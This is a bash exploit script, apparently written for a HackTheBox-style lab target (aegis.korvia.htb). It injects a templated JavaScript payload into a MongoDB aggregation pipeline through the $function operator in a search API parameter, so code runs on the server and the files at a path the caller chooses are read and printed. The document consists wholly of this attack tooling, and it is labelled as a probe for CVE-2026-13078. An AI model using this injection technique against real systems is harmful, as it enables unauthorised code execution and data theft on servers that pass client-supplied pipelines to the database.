#!/usr/bin/env bash
set -o pipefail

source "$(dirname -- "${BASH_SOURCE[0]}")/common.sh"

(( $# == 2 )) || {
  printf 'Usage: %s LABEL MODULE_PATH\n' "$0" >&2
  exit 2
}

label="$1"
read_path="$2"
[[ "$label" =~ ^[A-Za-z0-9._-]+$ ]] || exit 2
[[ "$read_path" =~ ^[A-Za-z0-9._/-]+$ ]] || exit 2

base='http://aegis.korvia.htb:3000/api/v1/aegis-mds/search'
template="$odyssey_root/artifacts/cve-2026-13078-probe.js"
body="$odyssey_root/responses/module-read-$label.body"
headers="$odyssey_root/responses/module-read-$label.headers"

js_body=$(sed "s|__PATH__|$read_path|g" "$template")
pipeline=$(jq -cn --arg body "$js_body" \
  '[{"$limit":1},{"$project":{
    "_id":0,
    "probe":{"$function":{"body":$body,"args":[],"lang":"js"}}
  }}]')

curl --connect-timeout 5 --max-time 20 -sS -G \
  -D "$headers" -o "$body" \
  --data-urlencode "pipeline=$pipeline" "$base"

awk 'NR==1{print "status=" $2}' "$headers"
jq . "$body" 2>/dev/null || sed -n '1,240p' "$body"
